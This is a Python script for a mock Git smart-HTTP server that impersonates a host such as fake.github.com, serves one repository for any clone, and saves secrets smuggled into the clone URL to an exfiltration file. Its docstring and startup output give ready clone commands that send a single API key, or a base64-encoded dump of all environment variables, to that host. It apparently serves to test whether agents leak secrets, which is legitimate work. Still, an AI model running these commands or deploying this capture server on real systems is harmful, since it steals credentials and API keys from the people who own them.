#!/usr/bin/env python3
"""
Mock Git smart-HTTP server that captures environment variables exfiltrated
through the clone URL.

It serves a single repository over Git's smart HTTP protocol for *any*
``git clone http://<host>/...`` request, while capturing secrets hidden in
the URL path.  Captured variables are appended to ``exfiltration.txt`` in
``--result-dir`` as ``VAR_NAME=value`` lines.

Two exfiltration formats are auto-detected (no flags needed):

  1. Single variable (name is carried in the URL itself):
        git clone "http://<host>/OPENAI_KEY=$OPENAI_KEY/repo.git"
     -> captures:  OPENAI_KEY=sk-...

  2. All variables (base64url-encoded ``env`` dump):
        git clone "http://<host>/$(env | base64 -w0 | tr '+/' '-_')/repo.git"
     -> decodes the blob and captures every VAR_NAME=value line

The repo name in the URL is ignored: every clone returns the repo pointed to
by ``--repo-path``.

Usage:
    sudo python3 mock_git_server.py \\
        --repo-path /path/to/repo.git \\
        --host fake.github.com \\
        --result-dir /home/user/exfil \\
        --port 80
"""

import argparse
import base64
import os
import re
import subprocess
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

RESULT_FILENAME = "exfiltration.txt"

# Matches a single VAR_NAME=value line (value may be empty or contain '=').
_ENV_LINE = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*)=(.*)$")


def _pkt_line(data: bytes) -> bytes:
    """Encode bytes as a git protocol pkt-line (4-hex length + payload)."""
    return format(len(data) + 4, "04x").encode() + data


def _parse_env_text(text: str):
    """Return [(name, value), ...] for every VAR=value line in *text*."""
    pairs = []
    for line in text.splitlines():
        m = _ENV_LINE.match(line)
        if m:
            pairs.append((m.group(1), m.group(2)))
    return pairs


def _classify(secret: str):
    """Classify a URL-path secret into [(name, value), ...] pairs.

    Order matters:
      * base64url-encoded ``env`` dump  -> many pairs (multi-var).
      * plain ``NAME=value``            -> single pair (single-var).
      * anything else                   -> saved under the name SECRET.
    """
    # 1) Try the multi-variable (base64url env dump) format first.
    padded = secret + "=" * (-len(secret) % 4)
    try:
        text = base64.urlsafe_b64decode(padded).decode("utf-8")
    except Exception:
        text = None
    if text is not None and "\n" in text:
        pairs = _parse_env_text(text)
        if pairs:
            return pairs

    # 2) Plain single-variable format: NAME=value.
    m = _ENV_LINE.match(secret)
    if m:
        return [(m.group(1), m.group(2))]

    # 3) Fallback: an unnamed value.
    return [("SECRET", secret)]


class ResultSink:
    """Append unique VAR_NAME=value lines to the results file."""

    def __init__(self, result_dir: str):
        os.makedirs(result_dir, exist_ok=True)
        self.path = os.path.join(result_dir, RESULT_FILENAME)
        self._seen = set()
        if os.path.exists(self.path):
            with open(self.path, "r") as f:
                for line in f:
                    self._seen.add(line.rstrip("\n"))

    def add(self, name: str, value: str) -> None:
        line = f"{name}={value}"
        if line in self._seen:
            return
        self._seen.add(line)
        with open(self.path, "a") as f:
            f.write(line + "\n")
        print(f"EXFILTRATED: {line}", flush=True)


class GitExfilServer(ThreadingHTTPServer):
    """HTTP server that carries the repo path, host and result sink."""

    def __init__(self, addr, handler, repo_path, host, result_dir):
        super().__init__(addr, handler)
        self.repo_path = repo_path
        self.host = host
        self.sink = ResultSink(result_dir)


class Handler(BaseHTTPRequestHandler):
    server_version = "MockGitServer/1.0"

    # -- helpers ----------------------------------------------------------

    def _send(self, code: int, content_type: str, body: bytes) -> None:
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-cache")
        self.end_headers()
        self.wfile.write(body)

    def _send_text(self, code: int, body: str) -> None:
        self._send(code, "text/plain; charset=utf-8", body.encode("utf-8"))

    def _log_host_mismatch(self) -> None:
        host = self.headers.get("Host", "")
        domain = host.rsplit(":", 1)[0]
        if self.server.host and domain and domain != self.server.host:
            print(f"WARNING: Host header {host!r} != configured {self.server.host!r}",
                  flush=True)

    # -- git smart HTTP ---------------------------------------------------

    def _handle_git_request(self) -> None:
        parsed = urlparse(self.path)
        path = parsed.path
        query = parse_qs(parsed.query)
        self._log_host_mismatch()

        if self.command == "GET" and path.endswith("/info/refs"):
            if query.get("service", [""])[0] != "git-upload-pack":
                self.send_error(403, "Only git-upload-pack is supported")
                return
            self._capture(path)
            self._serve_advertisement()

        elif self.command == "POST" and path.endswith("/git-upload-pack"):
            length = int(self.headers.get("Content-Length", "0"))
            req_body = self.rfile.read(length)
            self._capture(path)
            self._serve_upload_pack(req_body)

        else:
            self.send_error(404, "Not a git endpoint")

    def _serve_advertisement(self) -> None:
        proc = subprocess.run(
            ["git", "upload-pack", "--stateless-rpc", "--advertise-refs",
             self.server.repo_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        if proc.returncode != 0:
            self.send_error(500, proc.stderr.decode(errors="replace"))
            return

        # `git upload-pack --advertise-refs` omits the mandatory service
        # announcement, so prepend it per the smart HTTP protocol.
        body = _pkt_line(b"# service=git-upload-pack\n") + b"0000" + proc.stdout
        self._send(200, "application/x-git-upload-pack-advertisement", body)

    def _serve_upload_pack(self, req_body: bytes) -> None:
        proc = subprocess.run(
            ["git", "upload-pack", "--stateless-rpc", self.server.repo_path],
            input=req_body,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        if proc.returncode != 0:
            self.send_error(500, proc.stderr.decode(errors="replace"))
            return

        self._send(200, "application/x-git-upload-pack-result", proc.stdout)

    # -- exfiltration -----------------------------------------------------

    def _capture(self, path: str) -> None:
        """Extract the secret prefix from the URL path and save any vars."""
        for suffix in ("/info/refs", "/git-upload-pack"):
            if path.endswith(suffix):
                path = path[: -len(suffix)]
                break
        else:
            return

        # path is now "/<secret...>/<repo-name>"; the repo name is the last
        # segment, everything before it is the secret.
        parts = [p for p in path.split("/") if p]
        if len(parts) < 2:
            return
        secret = "/".join(parts[:-1])
        if not secret:
            return

        for name, value in _classify(secret):
            self.server.sink.add(name, value)

    # -- HTTP verbs -------------------------------------------------------

    def do_GET(self) -> None:
        if urlparse(self.path).path == "/":
            self._send_text(200, "mock git server: ok\n")
            return
        self._handle_git_request()

    def do_POST(self) -> None:
        self._handle_git_request()

    def log_message(self, fmt, *args) -> None:
        print(f"[{self.client_address[0]}] {fmt % args}", flush=True)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> None:
    p = argparse.ArgumentParser(
        description="Mock Git server that captures env vars exfiltrated via "
                    "the clone URL"
    )
    p.add_argument(
        "--repo-path",
        required=True,
        help="Path to the repository to serve (bare repo or working tree)",
    )
    p.add_argument(
        "--host",
        required=True,
        help="Web address the server impersonates, e.g. fake.github.com",
    )
    p.add_argument(
        "--result-dir",
        required=True,
        help="Directory where exfiltrated variables are saved",
    )
    p.add_argument(
        "--port",
        type=int,
        default=80,
        help="HTTP listen port (default: 80)",
    )
    args = p.parse_args()

    repo_path = os.path.abspath(args.repo_path)
    check = subprocess.run(
        ["git", "-C", repo_path, "rev-parse", "--git-dir"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    if check.returncode != 0:
        p.error(f"'{repo_path}' is not a git repository")

    server = GitExfilServer(
        ("0.0.0.0", args.port),
        Handler,
        repo_path=repo_path,
        host=args.host,
        result_dir=args.result_dir,
    )

    port_note = "" if args.port == 80 else f":{args.port}"
    print(f"Serving repo: {repo_path}", flush=True)
    print(f"Listening on 0.0.0.0:{args.port}  (host: {args.host})", flush=True)
    print(f"Results dir:  {os.path.abspath(args.result_dir)}", flush=True)
    print("", flush=True)
    print("Single-variable clone:", flush=True)
    print(
        f'  git clone "http://{args.host}{port_note}/OPENAI_KEY=$OPENAI_KEY/repo.git"',
        flush=True,
    )
    print("All-variables clone:", flush=True)
    print(
        f'  git clone "http://{args.host}{port_note}/'
        f'$(env | base64 -w0 | tr \'+/\' \'-_\')/repo.git"',
        flush=True,
    )

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down.", flush=True)
        server.server_close()
        sys.exit(0)


if __name__ == "__main__":
    main()
